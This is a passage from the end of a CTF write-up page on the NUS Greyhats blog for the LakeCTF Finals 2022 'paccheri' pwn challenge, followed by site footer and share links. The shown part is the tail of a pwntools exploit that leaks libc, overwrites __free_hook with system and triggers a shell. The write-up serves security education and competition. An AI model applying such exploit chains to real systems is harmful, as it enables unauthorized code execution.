</span></span><span style=display:flex><span>arbwrite(base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x13048</span>, p64(base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x13038</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>3</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Leak out libc</span>
</span></span><span style=display:flex><span>pkgs, _ <span style=color:#f92672>=</span> list_packages()
</span></span><span style=display:flex><span>leak <span style=color:#f92672>=</span> u64(pkgs[<span style=color:#ae81ff>0</span>][<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span> hex(leak) <span style=color:#e6db74>=  }</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span>  leak <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>symbols<span style=color:#f92672>.</span>printf
</span></span><span style=display:flex><span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>hex(libc<span style=color:#f92672>.</span>address) <span style=color:#e6db74>= }</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arbwrite(libc<span style=color:#f92672>.</span>symbols<span style=color:#f92672>.</span>__free_hook, p64(libc<span style=color:#f92672>.</span>symbols<span style=color:#f92672>.</span>system)<span style=color:#f92672>*</span><span style=color:#ae81ff>3</span>)
</span></span><span style=display:flex><span>report_lost(<span style=color:#ae81ff>4</span>) <span style=color:#75715e># calls free(package[4]-&gt;address), so system(&#34;/bin/sh&#34;) after the __free_hook overwrite</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://nusgreyhats.org/tags/writeups/>writeups</a></li><li><a href=https://nusgreyhats.org/tags/ctf/>ctf</a></li><li><a href=https://nusgreyhats.org/tags/pwn/>pwn</a></li></ul><nav class=paginav><a class=prev href=https://nusgreyhats.org/posts/writeups/lakectf-finals-2022-carboncredit-suisse/><span class=title>« Prev Page</span><br><span>[LakeCTF Finals 2022] CarbonCredit Suisse</span>
</a><a class=next href=https://nusgreyhats.org/posts/writeups/lakectf-finals-2022-calc-you-later/><span class=title>Next Page »</span><br><span>[LakeCTF Finals 2022] Calc-You-Later</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share [LakeCTF Finals 2022] paccheri on twitter" href="https://twitter.com/intent/tweet/?text=%5bLakeCTF%20Finals%202022%5d%20paccheri&amp;url=https%3a%2f%2fnusgreyhats.org%2fposts%2fwriteups%2flakectf-finals-2022-paccheri%2f&amp;hashtags=writeups%2cctf%2cpwn"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [LakeCTF Finals 2022] paccheri on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fnusgreyhats.org%2fposts%2fwriteups%2flakectf-finals-2022-paccheri%2f&amp;title=%5bLakeCTF%20Finals%202022%5d%20paccheri&amp;summary=%5bLakeCTF%20Finals%202022%5d%20paccheri&amp;source=https%3a%2f%2fnusgreyhats.org%2fposts%2fwriteups%2flakectf-finals-2022-paccheri%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [LakeCTF Finals 2022] paccheri on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fnusgreyhats.org%2fposts%2fwriteups%2flakectf-finals-2022-paccheri%2f&title=%5bLakeCTF%20Finals%202022%5d%20paccheri"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [LakeCTF Finals 2022] paccheri on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fnusgreyhats.org%2fposts%2fwriteups%2flakectf-finals-2022-paccheri%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [LakeCTF Finals 2022] paccheri on whatsapp" href="https://api.whatsapp.com/send?text=%5bLakeCTF%20Finals%202022%5d%20paccheri%20-%20https%3a%2f%2fnusgreyhats.org%2fposts%2fwriteups%2flakectf-finals-2022-paccheri%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [LakeCTF Finals 2022] paccheri on telegram" href="https://telegram.me/share/url?text=%5bLakeCTF%20Finals%202022%5d%20paccheri&amp;url=https%3a%2f%2fnusgreyhats.org%2fposts%2fwriteups%2flakectf-finals-2022-paccheri%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://nusgreyhats.org/>NUS Greyhats</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light"),document.getElementById("logo").src="/greyhats.png"):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"),document.getElementById("logo").src="/greyhats-dark.png")})</script></body></html>